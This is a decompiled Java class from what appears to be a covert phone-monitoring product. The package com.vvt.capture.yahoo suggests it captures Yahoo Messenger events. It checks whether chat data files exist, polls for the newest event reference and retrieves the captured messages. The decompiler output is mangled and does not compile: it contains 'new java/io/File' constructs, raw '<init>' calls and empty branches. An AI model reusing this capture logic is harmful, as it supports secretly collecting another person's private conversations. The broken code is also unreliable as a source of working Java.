package com.vvt.capture.yahoo.a;

import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.base.b;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.yahoo.c;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class e
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  private long d = -1;
  private String e;
  private b f;
  
  public e(String paramString, b paramb)
  {
    this.e = paramString;
    this.f = paramb;
  }
  
  private boolean b()
  {
    boolean bool1 = false;
    String[] arrayOfString = c.a();
    int i = arrayOfString.length;
    int j = 0;
    for (;;)
    {
      if (j < i)
      {
        String str = arrayOfString[j];
        File localFile = new java/io/File;
        localFile.<init>(str);
        boolean bool2 = localFile.exists();
        if (bool2) {
          bool1 = true;
        }
      }
      else
      {
        return bool1;
      }
      j += 1;
    }
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    long l2 = 3000L;
    SystemClock.sleep(l2);
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    boolean bool2;
    try
    {
      bool1 = b();
      if (bool1)
      {
        long l3 = c.b();
        bool1 = false;
        Object localObject = null;
        l2 = l3;
        int j = 0;
        for (;;)
        {
          boolean bool3 = l2 < l1;
          if (bool3) {
            break;
          }
          int k = 5;
          if (j >= k) {
            break;
          }
          l2 = 2000L;
          SystemClock.sleep(l2);
          long l4 = c.b();
          int i = j + 1;
          j = i;
          l2 = l4;
        }
      }
      boolean bool4;
      bool2 = b;
    }
    catch (Exception localException)
    {
      bool2 = c;
      if (bool2) {}
      l2 = l1;
      bool4 = l2 < l1;
      if (bool4) {
        break label171;
      }
    }
    if (bool2) {}
    l2 = this.d;
    for (;;)
    {
      Long localLong = Long.valueOf(l2);
      localFxSimpleEventReference.setReference(localLong);
      bool2 = a;
      if (bool2) {}
      return localFxSimpleEventReference;
      label171:
      this.d = l2;
    }
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      bool2 = b();
      if (bool2)
      {
        Object localObject = this.e;
        b localb = this.f;
        localObject = c.a((String)localObject, paramInt, localb);
        localArrayList.addAll((Collection)localObject);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = c;
        if (!bool2) {}
      }
    }
    bool2 = a;
    if (bool2) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject = paramg1.getReference();
      localObject = (Long)localObject;
      long l1 = ((Long)localObject).longValue();
      localObject = paramg2.getReference();
      localObject = (Long)localObject;
      long l2 = ((Long)localObject).longValue();
      localObject = this.e;
      b localb = this.f;
      localObject = c.a((String)localObject, l1, l2, localb);
      localArrayList.addAll((Collection)localObject);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/yahoo/a/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */